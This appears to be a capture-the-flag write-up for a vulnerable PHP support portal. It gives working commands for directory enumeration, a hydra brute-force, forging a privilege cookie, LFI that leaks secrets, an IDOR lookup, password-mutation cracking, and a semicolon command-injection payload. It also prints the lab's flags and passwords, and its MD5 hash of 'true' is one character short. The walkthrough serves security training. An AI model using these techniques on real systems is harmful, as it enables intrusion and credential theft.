# Support — Cookie Tampering → IDOR → LFI → Command Injection (RCE)

**Difficulty:** Medium
**Category:** Web Application Pentesting
**Techniques:** Credential Brute-Forcing, Insecure Cookie Trust, Local File Inclusion, IDOR/BOLA, Password Mutation, Command Injection

---

## Overview

The Support Operations Platform is an internal tool for IT and helpdesk teams, handling user management, internal APIs, and system-level operations. Security was clearly not the primary focus during development — several features trust user-controlled input and weak session data, ultimately allowing a low-privilege helpdesk account to escalate to full remote code execution.

**Attack chain:** `Credential Brute-Force → Cookie Tampering → LFI → IDOR → Password Mutation → Command Injection (RCE)`

---

## Step 1: Directory Enumeration

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,zip,js
```

**Discovered paths:**

```
index.php, config.php, dashboard.php, api.php, footer.php, /skins, /includes, /layout, /js
```

---

## Step 2: Credential Brute-Force

The login page required a corporate email and password. The page itself hinted at a known support contact address: `help@support.thm`.

With no valid password known, a brute-force attack was launched against this account:

```bash
hydra <TARGET_IP> http-post-form -l 'help@support.thm' \
  -P /usr/share/wordlists/rockyou.txt \
  '/:email=^USER^&password=^PASS^:Invalid credentials'
```

The attack succeeded, returning a valid password and granting access to the **Helpdesk Dashboard**.

---

## Step 3: Privilege Escalation via Cookie Tampering

Inspecting browser cookies revealed an `isITUser` cookie holding an MD5 hash of the string `"false"`. Later LFI access to the source code (Step 4) confirmed the logic:

```php
setcookie(
    'isITUser',
    $user['admin'] ? md5("true") : md5("false"),
    time() + 3600,
    '/'
);
```

```php
<?php if ($isIT === md5('true')): ?>
    <div class="card mt-4 border-success">
        <h5 class="text-success">IT Admin Panel</h5>
        <a href="api.php" class="btn btn-success">View API</a>
    </div>
<?php endif; ?>
```

The application trusted a **client-side, user-modifiable cookie** to determine IT privileges — a textbook broken access control flaw.

**Exploitation:** Computed the MD5 hash of `"true"`:

```bash
printf %s true | md5sum
# b326b5062b2f0e69046810717534cb0
```

Replaced the `isITUser` cookie value in the browser's DevTools with this hash and refreshed the page. This unlocked the **"IT Admin Panel"** with a **"View API"** button.

---

## Step 4: Local File Inclusion (LFI)

The site's theme selector (`?skin=`) passed user input directly into a server-side file path:

```php
$requested = realpath($webRoot . '/' . $skin . '.php');
if ($requested !== false && strpos($requested, $another) === 0) {
    readfile($requested);
}
```

By traversing one directory up, the application's own PHP source files could be read.

**Exploitation — reading `config.php`:**

```bash
curl -b "PHPSESSID=<session>" "http://<TARGET_IP>/dashboard.php?skin=../config"
```

**Result:**

```php
$MASTER_PASSWORD = 'support@110';
```

This same technique was used to pull `index.php`, `dashboard.php`, and `api.php` source code, which was invaluable for understanding the rest of the application's logic (and for confirming the cookie-based access control bypass above).

---

## Step 5: IDOR / Broken Object Level Authorization (BOLA)

The internal API exposed a `/user/<id>` endpoint without verifying whether the requester was authorized to view that specific user object:

```bash
curl -b "PHPSESSID=<session>" "http://<TARGET_IP>/user/1"
```

**Result:**

```json
{
    "email": "specialadmin@support.thm",
    "2FA": false,
    "admin": true
}
```

Simply incrementing the user ID in the API path exposed the administrator's email address — a classic **IDOR (Insecure Direct Object Reference) / BOLA** vulnerability.

---

## Step 6: Credential Cracking via Password Mutation

Direct credential stuffing with the leaked `support@110` password against the admin account failed. Since the admin was likely reusing a variation of this password, a mutated wordlist was generated using John the Ripper's mangling rules:

```bash
echo "support@110" > MASTER_PASSWORD.txt
john --wordlist=MASTER_PASSWORD.txt --stdout --rules:rockyou-30000 > rockyou-30000.txt
```

Re-attacked the admin login with the generated wordlist:

```bash
hydra <TARGET_IP> http-post-form -l 'specialadmin@support.thm' \
  -P rockyou-30000.txt \
  '/:email=^USER^&password=^PASS^:Invalid credentials'
```

**Result:**

```
login: specialadmin@support.thm   password: support110
```

The working password was simply the master password with the `@` symbol stripped — a predictable and crackable password reuse pattern.

---

## Step 7: Admin Login — First Flag

Logging in with the cracked credentials revealed the **"Administrator Access Confirmed"** panel, displaying the **first flag**:

```
THM{I_AM_ADMIN999}
```

---

## Step 8: Command Injection (RCE) — Second Flag

The admin dashboard exposed an additional feature: a Date/Time selector in the footer. Reviewing the source (again via the LFI primitive) revealed:

```php
if ($isAdmin && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['sys'])) {
    $sys = $_POST['sys'];

    if (strpos($sys, 'date') === 0) {
        $output = shell_exec($sys);
    } else {
        $error = 'Only date command is allowed.';
    }
}
```

The only validation performed was checking that the input **starts with** the string `"date"` — trivially bypassed by appending additional shell commands after a semicolon.

**Exploitation:**

```bash
curl -b "PHPSESSID=<admin_session>" -X POST http://<TARGET_IP>/dashboard.php \
  --data-urlencode 'sys=date +"%H:%M:%S"; cat /home/ubuntu/user.txt'
```

**Result:**

```
22:22:41
THM{GOT_THE_FLAG001}
```

Full remote code execution as `www-data` was achieved, confirmed via:

```bash
sys=date; id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Vulnerability Summary

| Vulnerability | Impact |
|---|---|
| Weak Credential Policy | Helpdesk account compromised via brute-force |
| Client-Side Trust (Cookie Tampering) | Privilege escalation to IT role |
| Local File Inclusion | Source code and secrets disclosure |
| IDOR / BOLA | Admin account email exposed via unauthorized API access |
| Predictable Password Reuse | Admin account compromised via password mutation |
| Command Injection | Full remote code execution as `www-data` |

---

## Key Takeaways

- **Never trust client-controlled data for authorization decisions.** The `isITUser` cookie should have been derived server-side from the session, not read back from the client.
- **LFI is a force multiplier.** Once source code is readable, every other vulnerability in the application becomes far easier to find and exploit.
- **IDOR/BOLA is one of the simplest vulnerabilities to find — and one of the most damaging.** A single unguarded numeric ID exposed the admin's identity.
- **Password reuse with minor mutations is still password reuse.** Tools like John's mangling rules make cracking "slightly different" passwords trivial.
- **Whitelisting by prefix (`strpos($sys, 'date') === 0`) is not input validation.** Any blocklist/prefix-check approach to command execution is fundamentally unsafe — user input should never reach `shell_exec()` at all.
